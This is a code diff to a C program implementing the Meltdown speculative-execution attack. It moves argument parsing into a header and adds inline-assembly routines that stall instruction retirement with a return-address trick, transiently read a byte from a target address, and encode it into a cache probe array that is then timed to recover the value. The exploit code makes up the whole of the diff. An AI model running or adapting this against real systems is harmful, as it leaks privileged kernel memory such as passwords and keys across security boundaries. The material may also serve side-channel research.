@@ -1,38 +1,4 @@
-#include <stdint.h>
-#include <stdio.h>
-#include <immintrin.h>
-#include <string.h>
-#include <unistd.h>
-#define PAGE_SIZE 4096
-#define ARR_SIZE 256
-
-void speculate(void* target_addr, void* L1);
-uint8_t leak_cache(void* target_addr, void* L1);
-void meltdown(void* addr, uint32_t* size);
-uint64_t get_time(void *addr);
-
-void main(int argc, char* argv[]) {
-
-	void* addr;	
-	uint32_t* size;
-
-	if(argc < 3) {
-		printf("./meltdown [address] [size]\n");
-		exit(1);
-	}	
-	
-	if(!sscanf(argv[1], "%p", &addr)) {
-		printf("Wrong address\n");
-		exit(2);
-	}
-	
-	if(!sscanf(argv[2], "%d", size)) {
-		printf("Wrong size\n");
-		exit(3);
-	}
-	
-	meltdown(addr, size);
-}
+#include "header.h"
 
 void meltdown(void* addr, uint32_t* size){
 
@@ -66,6 +32,31 @@ uint64_t get_time(void *addr){
 	);
 }
 
+void trigger_speculative_execution(void *addr, void *L1){
+	__asm__ __volatile__(
+		"mfence\n"
+		"call delay_commit\n"
+		"movzbl (%rdi),%eax\n"
+		"shl    $0xc,%eax\n"
+		"movzbl (%rsi,%rax,1),%eax\n"
+	);
+}
+
+void delay_commit(void){
+	__asm__ __volatile__(
+		"xorps  %xmm0,%xmm0\n"		
+		"sqrtpd %xmm0,%xmm0\n"
+		"sqrtpd %xmm0,%xmm0\n"
+		"sqrtpd %xmm0,%xmm0\n"
+		"sqrtpd %xmm0,%xmm0\n"
+		"movd   %xmm0,%eax\n"
+		"lea    0x10(%rsp,%rax,1),%rsp\n"
+		"pop	%rbp\n"
+		"retq\n"
+	);
+}
+
+
 uint8_t leak_cache(void* target_addr, void* L1) {
 	
 	uint64_t deter_table[ARR_SIZE];
@@ -77,7 +68,7 @@ uint8_t leak_cache(void* target_addr, void* L1) {
 	// Flush L1 Cache
 
 	syscall(0,0,0,0);
-	speculate(target_addr, L1);
+	trigger_speculative_execution(target_addr, L1);
 	
 	for(uint32_t i=0; i < ARR_SIZE; i++){
 		deter_table[i] = get_time(L1 + i * PAGE_SIZE);
